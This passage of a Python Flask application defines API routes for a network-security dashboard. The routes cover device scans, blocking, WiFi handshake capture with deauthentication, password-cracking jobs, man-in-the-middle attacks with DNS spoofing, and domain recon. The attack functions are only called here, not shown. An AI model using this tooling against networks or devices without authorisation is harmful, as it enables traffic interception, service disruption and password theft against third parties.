    last = conn.execute("SELECT * FROM scan_log ORDER BY id DESC LIMIT 1").fetchone()
    # wifi AP counts
    ap_count = conn.execute("SELECT COUNT(*) FROM wifi_ap_log").fetchone()[0]
    hs_count = conn.execute("SELECT COUNT(*) FROM wifi_handshakes").fetchone()[0]
    # bb summary
    bb_targets_count = conn.execute("SELECT COUNT(*) FROM bb_targets WHERE active=1").fetchone()[0]
    bb_hosts = conn.execute("SELECT COUNT(*) FROM bb_live_hosts").fetchone()[0]
    # pro recon summary
    try:
        snap_count = conn.execute("SELECT COUNT(*) FROM attack_snapshots").fetchone()[0]
        pro_count = conn.execute("SELECT COUNT(*) FROM pro_recon_log").fetchone()[0]
    except Exception:
        snap_count = pro_count = 0
    conn.close()
    return jsonify({
        "total_devices": total, "online_devices": online, "blocked_devices": blocked,
        "unknown_devices": unknown, "unread_alerts": unread,
        "gateway": get_default_gateway(), "local_ip": get_local_ip(),
        "network_range": get_network_range(), "platform": platform.system(),
        "last_scan": dict(last) if last else None,
        "wifi": {"ap_count": ap_count, "handshakes": hs_count,
                 "monitor_active": wifi_state.get("monitor_active", False),
                 "monitor_iface": wifi_state.get("monitor_interface")},
        "bugbounty": {"targets": bb_targets_count, "live_hosts": bb_hosts},
        "prorecon": {"jobs": pro_count, "snapshots": snap_count},
        "scapy_available": SCAPY_AVAILABLE, "scapy_error": SCAPY_IMPORT_ERROR,
        "ai": {"llm_enabled": get_setting("llm_enabled","0")=="1"},
    })


@app.route("/api/scan", methods=["POST"])
@login_required
def api_scan():
    client_ip = request.remote_addr
    if not check_rate_limit(client_ip):
        return jsonify({"success":False,"error":"Rate limit"}), 429
    t0 = time.time(); devices = arp_scan(); new_count = update_devices_db(devices); dur = time.time()-t0
    record_scan(client_ip)
    audit("manual_scan", details=f"devices={len(devices)} new={new_count} dur={dur:.2f}s")
    return jsonify({"success":True,"devices_found":len(devices),"new_devices":new_count,"duration":round(dur,2)})


@app.route("/api/devices")
@login_required
def api_devices():
    conn = get_db()
    devices = conn.execute("SELECT * FROM devices ORDER BY is_online DESC, last_seen DESC").fetchall()
    out = []
    for d in devices:
        dd = dict(d)
        osi = conn.execute("SELECT os_guess,confidence FROM os_fingerprint_log WHERE device_mac=?",(d["mac"],)).fetchone()
        dd["os_guess"] = osi["os_guess"] if osi else None
        dd["os_confidence"] = osi["confidence"] if osi else 0
        with data_lock:
            tr = per_device_traffic.get(d["mac"])
        dd["traffic_bytes"] = tr["bytes"] if tr else None
        dd["traffic_packets"] = tr["packets"] if tr else None
        out.append(dd)
    conn.close()
    return jsonify(out)


@app.route("/api/devices/<mac>", methods=["PUT"])
@login_required
def api_update_device(mac):
    data = get_json_body(); conn = get_db(); fields=[]; vals=[]
    valid_types = {"unknown","phone","tablet","laptop","desktop","tv","printer","smart_speaker","camera","iot","router","other"}
    for key in ("custom_name","device_type","notes","is_known"):
        if key in data:
            if key == "device_type" and data[key] not in valid_types: continue
            if key == "is_known":
                try: data[key] = int(data[key])
                except: continue
            if key in ("custom_name","notes"):
                data[key] = str(data[key])[:200]
            fields.append(f"{key}=?"); vals.append(data[key])
    if fields:
        vals.append(mac)
        conn.execute(f"UPDATE devices SET {', '.join(fields)} WHERE mac=?", vals); conn.commit()
    conn.close(); return jsonify({"success":True})


@app.route("/api/devices/<mac>/block", methods=["POST"])
@login_required
def api_block_device(mac):
    if not check_rate_limit(request.remote_addr): return jsonify({"success":False,"error":"Rate limit"}), 429
    record_scan(request.remote_addr)
    conn = get_db(); dev = conn.execute("SELECT ip,hostname FROM devices WHERE mac=?",(mac,)).fetchone()
    if not dev: conn.close(); return jsonify({"success":False,"error":"Not found"}),404
    ok,msg = block_device(dev["ip"], get_default_gateway())
    audit("block_device", device_mac=mac, device_ip=dev["ip"], details=msg, success=1 if ok else 0)
    if ok:
        conn.execute("UPDATE devices SET is_blocked=1 WHERE mac=?",(mac,))
        conn.execute("INSERT INTO alerts (timestamp,alert_type,message,device_mac) VALUES (?,?,?,?)",
                     (datetime.now().isoformat(),"device_blocked",f"Blocked {dev['ip']}",mac))
    conn.commit(); conn.close()
    return jsonify({"success":ok,"message":msg})


@app.route("/api/devices/<mac>/unblock", methods=["POST"])
@login_required
def api_unblock_device(mac):
    if not check_rate_limit(request.remote_addr): return jsonify({"success":False,"error":"Rate limit"}),429
    record_scan(request.remote_addr)
    conn = get_db(); dev = conn.execute("SELECT ip FROM devices WHERE mac=?",(mac,)).fetchone()
    if not dev: conn.close(); return jsonify({"success":False,"error":"Not found"}),404
    ok,msg = unblock_device(dev["ip"], get_default_gateway())
    audit("unblock_device", device_mac=mac, device_ip=dev["ip"], details=msg, success=1 if ok else 0)
    if ok: conn.execute("UPDATE devices SET is_blocked=0 WHERE mac=?",(mac,))
    conn.commit(); conn.close()
    return jsonify({"success":ok,"message":msg})


@app.route("/api/devices/<mac>/message", methods=["POST"])
@login_required
def api_send_msg(mac):
    data = get_json_body(); msg = str(data.get("message",""))[:500]
    if not msg: return jsonify({"success":False,"error":"no message"}),400
    conn = get_db(); dev = conn.execute("SELECT ip FROM devices WHERE mac=?",(mac,)).fetchone(); conn.close()
    if not dev: return jsonify({"success":False,"error":"not found"}),404
    ok,m = send_network_message(dev["ip"], msg)
    return jsonify({"success":ok,"message":m})


@app.route("/api/devices/<mac>/portscan", methods=["POST"])
@login_required
def api_port_scan(mac):
    data = get_json_body()
    if not check_rate_limit(request.remote_addr): return jsonify({"success":False,"error":"Rate limit"}),429
    pr = str(data.get("range","1-1024"))
    stype = str(data.get("type","connect"))
    if stype not in ("connect","syn","udp"): return jsonify({"success":False,"error":"bad type"}),400
    m = re.match(r"^(\d{1,5})-(\d{1,5})$", pr)
    if not m: return jsonify({"success":False,"error":"bad range, use N-N"}),400
    sp,ep = int(m.group(1)), int(m.group(2))
    if not (1<=sp<=65535 and 1<=ep<=65535 and sp<=ep): return jsonify({"success":False,"error":"bad port range"}),400
    if ep-sp>10000: return jsonify({"success":False,"error":"range too large (max 10k)"}),400
    conn = get_db(); dev = conn.execute("SELECT ip,mac FROM devices WHERE mac=?",(mac,)).fetchone(); conn.close()
    if not dev: return jsonify({"success":False,"error":"not found"}),404
    result_q: queue.Queue = queue.Queue()
    def runner():
        ports = run_port_scan(dev["ip"], pr, scan_type=stype, device_mac=dev["mac"])
        result_q.put(ports)
    ok,qmsg = add_scan_to_queue(runner)
    if not ok: return jsonify({"success":False,"error":qmsg}),503
    try:
        ports = result_q.get(timeout=120)
    except queue.Empty:
        return jsonify({"success":False,"error":"timeout"}),504
    record_scan(request.remote_addr)
    audit("port_scan", device_mac=mac, device_ip=dev["ip"], details=f"range={pr} type={stype} open={len(ports)}")
    return jsonify({"success":True,"ip":dev["ip"],"ports":ports})


@app.route("/api/devices/<mac>/fingerprint", methods=["POST"])
@login_required
def api_fp(mac):
    if not check_rate_limit(request.remote_addr): return jsonify({"success":False,"error":"Rate limit"}),429
    conn = get_db(); dev = conn.execute("SELECT ip,mac,vendor FROM devices WHERE mac=?",(mac,)).fetchone()
    if not dev: conn.close(); return jsonify({"success":False,"error":"not found"}),404
    if not SCAPY_AVAILABLE: conn.close(); return jsonify({"success":False,"error":"scapy unavailable"}),400
    res = active_os_fingerprint(dev["ip"])
    if not res: conn.close(); return jsonify({"success":False,"error":"no response"}),408
    save_os_fingerprint(conn, dev["mac"], dev["ip"], dev["vendor"] or "Unknown")
    osi = conn.execute("SELECT os_guess,confidence FROM os_fingerprint_log WHERE device_mac=?",(mac,)).fetchone()
    conn.commit(); conn.close()
    record_scan(request.remote_addr)
    return jsonify({"success":True,"ip":dev["ip"],"ttl":res["ttl"],"tcp_window_size":res["tcp_window_size"],
                    "os_guess":osi["os_guess"] if osi else "Unknown","os_confidence":osi["confidence"] if osi else 0})


@app.route("/api/devices/<mac>/vulnscan", methods=["POST"])
@login_required
def api_vuln(mac):
    if not check_rate_limit(request.remote_addr): return jsonify({"success":False,"error":"Rate limit"}),429
    conn = get_db(); dev = conn.execute("SELECT ip FROM devices WHERE mac=?",(mac,)).fetchone(); conn.close()
    if not dev: return jsonify({"success":False,"error":"not found"}),404
    vulns = vulnerability_scan(dev["ip"]); record_scan(request.remote_addr)
    audit("vuln_scan", device_mac=mac, device_ip=dev["ip"], details=f"found={len(vulns)}")
    return jsonify({"success":True,"ip":dev["ip"],"vulnerabilities":vulns})


# ---- WiFi API ----
@app.route("/api/wifi")
@login_required
def api_wifi(): return jsonify(get_wifi_info())


@app.route("/api/wifi/security")
@login_required
def api_wifi_sec():
    w = get_wifi_info(); return jsonify({"wifi":w,"security":wifi_security_scan(w)})


@app.route("/api/wifi/supported")
@login_required
def api_wifi_supported():
    return jsonify({
        "supported": wifi_supported(),
        "platform": platform.system(),
        "has_iw": bool(shutil.which("iw")),
        "has_airmon": bool(shutil.which("airmon-ng")),
        "scapy": SCAPY_AVAILABLE,
        "is_root": hasattr(os,"geteuid") and os.geteuid()==0,
        "monitor_active": wifi_state.get("monitor_active", False),
        "monitor_iface": wifi_state.get("monitor_interface"),
    })


@app.route("/api/wifi/monitor/enable", methods=["POST"])
@login_required
def api_wifi_mon_en():
    if hasattr(os,"geteuid") and os.geteuid()!=0:
        return jsonify({"success":False,"error":"root required"}),400
    data = get_json_body(); iface = data.get("iface") or get_wifi_interface()
    ch = data.get("channel"); ch = int(ch) if ch else None
    ok,msg = wifi_enable_monitor(iface, ch); return jsonify({"success":ok,"message":msg})


@app.route("/api/wifi/monitor/disable", methods=["POST"])
@login_required
def api_wifi_mon_dis():
    ok,msg = wifi_disable_monitor(); return jsonify({"success":ok,"message":msg})


@app.route("/api/wifi/survey/start", methods=["POST"])
@login_required
def api_wifi_survey():
    data = get_json_body()
    dur = int(data.get("duration", 45)); ch_hop = bool(data.get("hop", True))
    ok,msg = wifi_start_survey(duration=dur, channel_hop=ch_hop)
    return jsonify({"success":ok,"message":msg})


@app.route("/api/wifi/aps")
@login_required
def api_wifi_aps():
    inmem = wifi_get_aps()
    conn = get_db(); rows = conn.execute("SELECT * FROM wifi_ap_log ORDER BY last_seen DESC LIMIT 300").fetchall(); conn.close()
    drows = [dict(r) for r in rows]
    # merge in-memory flags
    by_bssid = {a["bssid"]:a for a in inmem}
    for r in drows:
        if r["bssid"] in by_bssid:
            r.update({k:by_bssid[r["bssid"]].get(k,r.get(k)) for k in ("power_dbm","beacons","last_seen")})
    return jsonify(drows)


@app.route("/api/wifi/handshakes", methods=["GET","POST"])
@login_required
def api_wifi_hs():
    if request.method == "POST":
        data = get_json_body()
        bssid = (data.get("bssid") or "").upper() or None
        deauth = bool(data.get("deauth", False))
        ok,msg = wifi_start_handshake_capture(bssid, deauth=deauth, deauth_count=int(data.get("deauth_count",6)))
        return jsonify({"success":ok,"message":msg})
    return jsonify(wifi_get_handshakes())


@app.route("/api/wifi/handshakes/stop", methods=["POST"])
@login_required
def api_wifi_hs_stop():
    ok,msg = wifi_stop_handshake_capture(); return jsonify({"success":ok,"message":msg})


@app.route("/api/wifi/handshakes/<int:hid>/pcap")
@login_required
def api_wifi_hs_pcap(hid):
    conn = get_db(); r = conn.execute("SELECT * FROM wifi_handshakes WHERE id=?",(hid,)).fetchone(); conn.close()
    if not r or not r["pcap_path"] or not os.path.exists(r["pcap_path"]):
        return jsonify({"success":False,"error":"pcap missing"}),404
    with open(r["pcap_path"], "rb") as f:
        data = f.read()
    safe = re.sub(r"[^a-zA-Z0-9_-]+","_",r["ssid"] or r["bssid"])
    return Response(data, mimetype="application/octet-stream",
                    headers={"Content-Disposition": f"attachment; filename=handshake_{safe}_{hid}.pcap"})


@app.route("/api/wifi/handshakes/<int:hid>/hashcat")
@login_required
def api_wifi_hs_hc(hid):
    conn = get_db(); r = conn.execute("SELECT * FROM wifi_handshakes WHERE id=?",(hid,)).fetchone(); conn.close()
    if not r or not r["hashcat_22000"]:
        return jsonify({"success":False,"error":"no hashcat blob"}),404
    safe = re.sub(r"[^a-zA-Z0-9_-]+","_",r["ssid"] or r["bssid"])
    return Response(r["hashcat_22000"]+"\n", mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename=22000_{safe}_{hid}.txt"})


@app.route("/api/wifi/survey.csv")
@login_required
def api_wifi_csv():
    return Response(wifi_site_survey_csv(), mimetype="text/csv",
                    headers={"Content-Disposition":"attachment; filename=wifi_survey.csv"})


@app.route("/api/wifi/events")
@login_required
def api_wifi_events():
    conn = get_db(); lim = min(max(request.args.get("limit",100,type=int),1),500)
    rows = conn.execute("SELECT * FROM wifi_event_log ORDER BY timestamp DESC LIMIT ?",(lim,)).fetchall(); conn.close()
    return jsonify([dict(r) for r in rows])


# ---- Batch I: WiFi pentest wizard + crack lab ----
@app.route("/api/wifi/capabilities")
@login_required
def api_wifi_caps():
    return jsonify(wifi_capabilities())


@app.route("/api/wifi/audit/start", methods=["POST"])
@login_required
def api_wifi_audit_start():
    d = get_json_body()
    bssid = (d.get("bssid") or "").upper() or None
    survey = min(max(int(d.get("survey_seconds", 45)), 5), 600)
    hs = min(max(int(d.get("handshake_seconds", 90)), 10), 900)
    deauth = bool(d.get("deauth", False))
    if deauth and get_setting("confirm_attack", "1") == "1" and not d.get("confirmed"):
        return jsonify({"success": False,
                        "error": "deauth is disruptive — resend with confirmed=true after the UI prompt"}), 400
    job_id, err = start_wifi_audit(bssid, survey, hs, deauth)
    audit("wifi_audit_start", details=f"bssid={bssid or 'all'} survey={survey}s hs={hs}s deauth={deauth}")
    return jsonify({"success": True, "job_id": job_id})


@app.route("/api/wifi/audit/jobs")
@login_required
def api_wifi_audit_jobs():
    return jsonify(list_wifi_audits())


@app.route("/api/wifi/audit/jobs/<job_id>")
@login_required
def api_wifi_audit_job(job_id):
    j = wifi_audit_job(job_id)
    if not j:
        return jsonify({"success": False, "error": "not found"}), 404
    return jsonify({"success": True, "job": j})


@app.route("/api/wifi/wordlists")
@login_required
def api_wifi_wordlists():
    return jsonify({"dir": WORDLIST_DIR, "wordlists": list_wordlists()})


@app.route("/api/wifi/handshakes/<int:hid>/crack", methods=["POST"])
@login_required
def api_wifi_crack(hid):
    d = get_json_body()
    wl = str(d.get("wordlist", "")).strip()
    if not wl:
        return jsonify({"success": False, "error": "wordlist required (name from /api/wifi/wordlists)"}), 400
    ok, engine_or_msg, job_id = start_crack_job(hid, wl)
    if not ok:
        return jsonify({"success": False, "error": engine_or_msg}), 400
    audit("wifi_crack_start", details=f"hs={hid} engine={engine_or_msg} wl={wl}")
    return jsonify({"success": True, "engine": engine_or_msg, "job_id": job_id})


@app.route("/api/wifi/crack/<job_id>")
@login_required
def api_wifi_crack_status(job_id):
    j = crack_job(job_id)
    if not j:
        return jsonify({"success": False, "error": "not found"}), 404
    return jsonify({"success": True, "job": j})


@app.route("/api/wifi/crack/<job_id>/stop", methods=["POST"])
@login_required
def api_wifi_crack_stop(job_id):
    ok, msg = stop_crack_job(job_id)
    return jsonify({"success": ok, "message": msg})


# ---- Block/MITM/DNS spoof packet-capture/alerts/traffic/ja3/dns/parental/export (compact) ----
@app.route("/api/bandwidth")
@login_required
def api_bw(): return jsonify(get_bandwidth())


@app.route("/api/speedtest", methods=["POST"])
@login_required
def api_speed():
    audit("speedtest", details="executed"); return jsonify(run_speed_test())


@app.route("/api/packet-capture/start", methods=["POST"])
@login_required
def api_cap_start():
    d = get_json_body(); ok,msg = start_packet_capture(d.get("iface"), str(d.get("filter",""))[:200], int(d.get("count",0)))
    if ok: audit("pcap_start", details=f"iface={d.get('iface')} filter={d.get('filter')}")
    return jsonify({"success":ok,"message":msg})


@app.route("/api/packet-capture/stop", methods=["POST"])
@login_required
def api_cap_stop():
    ok,msg = stop_packet_capture(); return jsonify({"success":ok,"message":msg})


@app.route("/api/packet-capture/clear", methods=["POST"])
@login_required
def api_cap_clear():
    ok,msg = clear_captured_packets(); return jsonify({"success":ok,"message":msg})


@app.route("/api/packet-capture/data")
@login_required
def api_cap_data():
    lim = min(max(request.args.get("limit",100,type=int),1),500)
    return jsonify({"packets":get_captured_packets(lim),"count":len(get_captured_packets(lim))})


@app.route("/api/alerts")
@login_required
def api_alerts():
    conn = get_db(); lim=min(max(request.args.get("limit",50,type=int),1),500)
    rows = conn.execute("SELECT * FROM alerts ORDER BY timestamp DESC LIMIT ?",(lim,)).fetchall(); conn.close()
    return jsonify([dict(a) for a in rows])


@app.route("/api/alerts/read", methods=["POST"])
@login_required
def api_alerts_read():
    conn = get_db(); conn.execute("UPDATE alerts SET is_read=1"); conn.commit(); conn.close(); return jsonify({"success":True})


@app.route("/api/audit-log")
@login_required
def api_audit():
    conn = get_db(); lim=min(max(request.args.get("limit",200,type=int),1),1000)
    at = request.args.get("action_type")
    if at: rows = conn.execute("SELECT * FROM audit_log WHERE action_type=? ORDER BY timestamp DESC LIMIT ?",(at,lim)).fetchall()
    else: rows = conn.execute("SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT ?",(lim,)).fetchall()
    conn.close(); return jsonify([dict(r) for r in rows])


@app.route("/api/dns-queries")
@login_required
def api_dnsq():
    conn = get_db(); lim=min(max(request.args.get("limit",100,type=int),1),500)
    mt = max(request.args.get("min_threat",0,type=int),0)
    if mt: rows = conn.execute("SELECT * FROM dns_query_log WHERE threat_score>=? ORDER BY timestamp DESC LIMIT ?",(mt,lim)).fetchall()
    else: rows = conn.execute("SELECT * FROM dns_query_log ORDER BY timestamp DESC LIMIT ?",(lim,)).fetchall()
    conn.close(); return jsonify([dict(r) for r in rows])


@app.route("/api/passive-dns")
@login_required
def api_pdns():
    conn = get_db(); mac=request.args.get("mac"); lim=min(max(request.args.get("limit",50,type=int),1),200)
    if mac:
        rows = conn.execute("SELECT domain,SUM(visit_count) total_visits,MAX(timestamp) last_seen FROM passive_dns_log WHERE source_mac=? GROUP BY domain ORDER BY total_visits DESC LIMIT ?",(mac,lim)).fetchall()
    else:
        rows = conn.execute("SELECT domain,source_mac,SUM(visit_count) total_visits,MAX(timestamp) last_seen FROM passive_dns_log GROUP BY domain,source_mac ORDER BY total_visits DESC LIMIT ?",(lim,)).fetchall()
    conn.close(); return jsonify([dict(r) for r in rows])


@app.route("/api/port-history")
@login_required
def api_porthist():
    conn = get_db(); mac=request.args.get("mac"); newonly=request.args.get("new_only","false").lower()=="true"
    lim=min(max(request.args.get("limit",200,type=int),1),500)
    if mac:
        if newonly: rows=conn.execute("SELECT * FROM port_scan_history WHERE device_mac=? AND is_new=1 ORDER BY first_seen DESC LIMIT ?",(mac,lim)).fetchall()
        else: rows=conn.execute("SELECT * FROM port_scan_history WHERE device_mac=? ORDER BY last_seen DESC LIMIT ?",(mac,lim)).fetchall()
    else: rows=conn.execute("SELECT * FROM port_scan_history ORDER BY last_seen DESC LIMIT ?",(lim,)).fetchall()
    conn.close(); return jsonify([dict(r) for r in rows])


@app.route("/api/ja3-fingerprints")
@login_required
def api_ja3():
    conn = get_db(); lim=min(max(request.args.get("limit",100,type=int),1),500)
    sus = request.args.get("suspicious","false").lower()=="true"
    if sus: rows=conn.execute("SELECT * FROM ja3_log WHERE is_suspicious=1 ORDER BY timestamp DESC LIMIT ?",(lim,)).fetchall()
    else: rows=conn.execute("SELECT * FROM ja3_log ORDER BY timestamp DESC LIMIT ?",(lim,)).fetchall()
    conn.close(); return jsonify([dict(r) for r in rows])


@app.route("/api/mitm-alerts")
@login_required
def api_mitm():
    lim=min(max(request.args.get("limit",50,type=int),1),500)
    with data_lock: return jsonify(list(MITM_ALERTS[-lim:]))


@app.route("/api/rogue-dhcp-alerts")
@login_required
def api_rdhcp():
    lim=min(max(request.args.get("limit",50,type=int),1),500)
    with data_lock: return jsonify(list(ROGUE_DHCP_ALERTS[-lim:]))


@app.route("/api/live-traffic")
@login_required
def api_livetraffic():
    lim=min(max(request.args.get("limit",100,type=int),1),500)
    with data_lock: return jsonify(list(live_traffic[-lim:]))


@app.route("/api/traffic-summary")
@login_required
def api_trafsum():
    with data_lock:
        s = [{"mac":m,**i} for m,i in per_device_traffic.items()]
    s.sort(key=lambda x:x.get("bytes",0), reverse=True)
    return jsonify(s[:200])


@app.route("/api/active-mitm")
@login_required
def api_active_mitm(): return jsonify(get_active_mitm_attacks())


@app.route("/api/mitm/wizard/start", methods=["POST"])
@login_required
def api_mitm_wizard_start():
    d = get_json_body()
    tgt = str(d.get("target", "")).strip()
    if not tgt:
        tgt = str(d.get("ip", "")).strip()
    if not tgt and d.get("mac"):
        conn = get_db()
        row = conn.execute("SELECT ip FROM devices WHERE mac=?", (d["mac"],)).fetchone()
        conn.close()
        tgt = row["ip"] if row else ""
    if not tgt:
        return jsonify({"success": False, "error": "target ip (or device mac) required"}), 400
    try:
        ipaddress.ip_address(tgt)
    except ValueError:
        return jsonify({"success": False, "error": "not a valid IP"}), 400
    ok, msg = start_mitm_wizard(tgt)
    return jsonify({"success": ok, "message": msg})


@app.route("/api/mitm/wizard/stop", methods=["POST"])
@login_required
def api_mitm_wizard_stop():
    ok, msg = stop_mitm_wizard()
    return jsonify({"success": ok, "message": msg})


@app.route("/api/mitm/wizard/status")
@login_required
def api_mitm_wizard_status():
    return jsonify(mitm_wizard_status())


@app.route("/api/devices/<mac>/start-mitm", methods=["POST"])
@login_required
def api_start_mitm(mac):
    conn = get_db(); d=conn.execute("SELECT ip FROM devices WHERE mac=?",(mac,)).fetchone(); conn.close()
    if not d: return jsonify({"success":False,"error":"not found"}),404
    data=get_json_body(); ok,msg=start_mitm_attack(d["ip"], bool(data.get("dns_spoof",False)), data.get("fake_ip"))
    return jsonify({"success":ok,"message":msg})


@app.route("/api/devices/<mac>/stop-mitm", methods=["POST"])
@login_required
def api_stop_mitm(mac):
    conn = get_db(); d=conn.execute("SELECT ip FROM devices WHERE mac=?",(mac,)).fetchone(); conn.close()
    if not d: return jsonify({"success":False,"error":"not found"}),404
    ok,msg=stop_mitm_attack(d["ip"]); return jsonify({"success":ok,"message":msg})


@app.route("/api/dns-spoof-rules", methods=["GET","POST"])
@login_required
def api_dns_rules():
    if request.method=="GET": return jsonify(get_dns_spoof_rules())
    d=get_json_body(); dom=str(d.get("domain","")).strip().lower()[:255]; ip=str(d.get("fake_ip","")).strip()
    if not dom or not ip: return jsonify({"success":False,"error":"domain+fake_ip required"}),400
    if not re.match(r"^[a-z0-9\.\-]+$",dom): return jsonify({"success":False,"error":"bad domain"}),400
    try: ipaddress.ip_address(ip)
    except: return jsonify({"success":False,"error":"bad ip"}),400
    ok,msg=add_dns_spoof_rule(dom,ip); return jsonify({"success":ok,"message":msg})


@app.route("/api/dns-spoof-rules/<path:domain>", methods=["DELETE"])
@login_required
def api_del_dns_rule(domain):
    ok,msg=remove_dns_spoof_rule(domain); return jsonify({"success":ok,"message":msg})


@app.route("/api/network-info")
@login_required
def api_netinfo():
    ifaces = {}
    for name, addrs in psutil.net_if_addrs().items():
        if name=="lo": continue
        info={"ipv4":None,"ipv6":None,"mac":None,"netmask":None}
        for a in addrs:
            if a.family==socket.AF_INET: info["ipv4"]=a.address; info["netmask"]=a.netmask
            elif a.family==socket.AF_INET6: info["ipv6"]=a.address
            elif a.family==psutil.AF_LINK: info["mac"]=a.address
        if info["ipv4"] or info["mac"]: ifaces[name]=info
    return jsonify({"interfaces":ifaces,"gateway":get_default_gateway(),"hostname":socket.gethostname(),"wifi":get_wifi_info()})


@app.route("/api/parental-rules", methods=["GET","POST"])
@login_required
def api_parental():
    if request.method=="GET":
        conn=get_db(); rows=conn.execute("SELECT * FROM parental_rules").fetchall(); conn.close(); return jsonify([dict(r) for r in rows])
    d=get_json_body()
    valid_d={"everyday","weekdays","weekends","monday","tuesday","wednesday","thursday","friday","saturday","sunday"}
    if d.get("day_of_week") not in valid_d: return jsonify({"success":False,"error":"bad day"}),400
    for k in ("start_time","end_time"):
        if not re.match(r"^([01]\d|2[0-3]):[0-5]\d$", str(d.get(k,""))): return jsonify({"success":False,"error":f"bad time {k}"}),400
    conn=get_db(); conn.execute("INSERT INTO parental_rules (device_mac,day_of_week,start_time,end_time,action) VALUES (?,?,?,?,?)",
                               (d.get("device_mac",""),d.get("day_of_week"),d.get("start_time"),d.get("end_time"),d.get("action","block")))
    audit("parental_rule_add", details=f"for {d.get('device_mac')}"); conn.commit(); conn.close()
    return jsonify({"success":True})


@app.route("/api/parental-rules/<int:rid>", methods=["DELETE"])
@login_required
def api_parental_del(rid):
    conn=get_db(); conn.execute("DELETE FROM parental_rules WHERE id=?",(rid,)); conn.commit(); conn.close()
    audit("parental_rule_delete", details=f"id={rid}"); return jsonify({"success":True})


@app.route("/api/security-report")
@login_required
def api_secreport(): return jsonify(generate_security_report())


@app.route("/api/bandwidth-history")
@login_required
def api_bw_hist():
    conn=get_db(); rows=conn.execute("SELECT * FROM bandwidth_log ORDER BY timestamp ASC LIMIT 2000").fetchall(); conn.close()
    by_if = defaultdict(list)
    for r in rows: by_if[r["interface"]].append(r)
    out=[]
    for iface, samps in by_if.items():
        for a,b in zip(samps, samps[1:]):
            try:
                dt=(datetime.fromisoformat(b["timestamp"])-datetime.fromisoformat(a["timestamp"])).total_seconds()
            except: continue
            if dt<=0: continue
            dl=max(0,(b["bytes_recv"]-a["bytes_recv"]))/dt; ul=max(0,(b["bytes_sent"]-a["bytes_sent"]))/dt
            out.append({"timestamp":b["timestamp"],"interface":iface,"download_speed":round(dl,2),"upload_speed":round(ul,2)})
    return jsonify(out[-300:])


@app.route("/api/export/<fmt>")
@login_required
def api_export(fmt):
    conn=get_db(); devs=conn.execute("SELECT * FROM devices ORDER BY is_online DESC,last_seen DESC").fetchall(); conn.close()
    if fmt=="json": return jsonify([dict(d) for d in devs])
    if fmt=="csv":
        o=io.StringIO(); w=csv.writer(o)
        w.writerow(["MAC","IP","Hostname","Vendor","Type","Custom Name","Status","First Seen","Last Seen","Blocked","Known"])
        for d in devs:
            w.writerow([d["mac"],d["ip"],d["hostname"],d["vendor"],d["device_type"],d["custom_name"],
                        "Online" if d["is_online"] else "Offline",d["first_seen"],d["last_seen"],
                        "Yes" if d["is_blocked"] else "No","Yes" if d["is_known"] else "No"])
        return Response(o.getvalue(), mimetype="text/csv", headers={"Content-Disposition":"attachment; filename=devices.csv"})
    return jsonify({"error":"invalid"}),400


# ============================================================
# ROUTES: tools + recon + bug bounty + AI + settings
# ============================================================
@app.route("/api/tools/status")
@login_required
def api_tools_status():
    force = request.args.get("force","0") == "1"
    return jsonify(get_tools_status(force_refresh=force))


@app.route("/api/tools/install/<name>", methods=["POST"])
@login_required
def api_tools_install(name):
    if hasattr(os,"geteuid") and os.geteuid()!=0:
        return jsonify({"success":False,"error":"root required"}),400
    ok,msg = install_tool(name)
    audit("tool_install", details=f"{name}: {msg}")
    return jsonify({"success":ok,"message":msg})


# ----- Recon -----
@app.route("/api/recon/start", methods=["POST"])
@login_required
def api_recon_start():
    d=get_json_body(); tgt=str(d.get("target","")).strip()
    if not tgt: return jsonify({"success":False,"error":"target required"}),400
    modes = tuple(d.get("modes") or ("subdomains","ports","http","tls","deepweb"))
    # "http" implies the TLS phase too (UI labels it "http/tls")
    if "http" in modes and "tls" not in modes:
        modes = tuple(list(modes) + ["tls"])
    if d.get("vt"): modes = tuple(list(modes) + ["vt"])
    job_id = start_recon_job(tgt, modes=modes)
    return jsonify({"success":True,"job_id":job_id})


@app.route("/api/recon/jobs/<job_id>")
@login_required
def api_recon_job(job_id):
    j = get_recon_job(job_id)
    if not j:
        conn=get_db(); r=conn.execute("SELECT * FROM recon_log WHERE job_id=?",(job_id,)).fetchone(); conn.close()
        if not r: return jsonify({"success":False,"error":"not found"}),404
        j = dict(r)
        # deserialize json cols lazily
        for col in ("subdomains_json","open_ports_json","http_json","tls_json","vt_json","deep_web_json"):
            try: j[col.replace("_json","")] = json.loads(j[col]) if j[col] else None
            except: j[col.replace("_json","")] = None
    return jsonify({"success":True,"job":j})


@app.route("/api/recon/jobs")
@login_required
def api_recon_jobs():
    return jsonify(list_recent_recon(50))


@app.route("/api/recon/deepweb/<job_id>")
@login_required
def api_recon_deepweb(job_id):
    j = get_recon_job(job_id)
    if not j: return jsonify({"success":False,"error":"not found"}),404
    return jsonify({"success":True,"results":j.get("deep_web",[])})


# ----- BATCH H: Pro Recon (one-click full pipeline + intel modules) -----
@app.route("/api/prorecon/start", methods=["POST"])
@login_required
def api_pro_start():
    if not REQUESTS_AVAILABLE:
        return jsonify({"success":False,"error":"requests library unavailable"}),503
    d = get_json_body()
    tgt = str(d.get("target","")).strip()
    if not tgt:
        return jsonify({"success":False,"error":"target required"}),400
    host = _safe_host(tgt)
    if not host or len(host) > 253 or ".." in host:
        return jsonify({"success":False,"error":"bad target"}),400
    profile = str(d.get("profile","quick"))
    job_id = start_pro_recon(host, profile)
    audit("pro_recon_start", details=f"{host} profile={profile}")
    return jsonify({"success":True,"job_id":job_id})


@app.route("/api/prorecon/jobs")
@login_required
def api_pro_jobs():
    return jsonify(list_pro_jobs(40))


@app.route("/api/prorecon/jobs/<job_id>")
@login_required
def api_pro_job(job_id):
    j = get_pro_job(job_id)
    if not j:
        return jsonify({"success":False,"error":"not found"}),404
    return jsonify({"success":True,"job":j})


@app.route("/api/recon/dns", methods=["POST"])
@login_required
def api_recon_dns():
    d = get_json_body()
    host = _safe_host(str(d.get("target","") or d.get("domain","")))
    if not host:
        return jsonify({"success":False,"error":"target required"}),400
    audit("dns_dump", details=host)
    return jsonify({"success":True,"result":_dns_dump(host)})


@app.route("/api/recon/whois", methods=["POST"])
@login_required
def api_recon_whois():
    d = get_json_body()
    q = str(d.get("target","")).strip()
    if not q:
        return jsonify({"success":False,"error":"target required"}),400
    try:
        ipaddress.ip_address(q)
        kind = "ip"
    except ValueError:
        kind = "domain"
        q = _safe_host(q)
    audit("whois_lookup", details=f"{kind}:{q}")
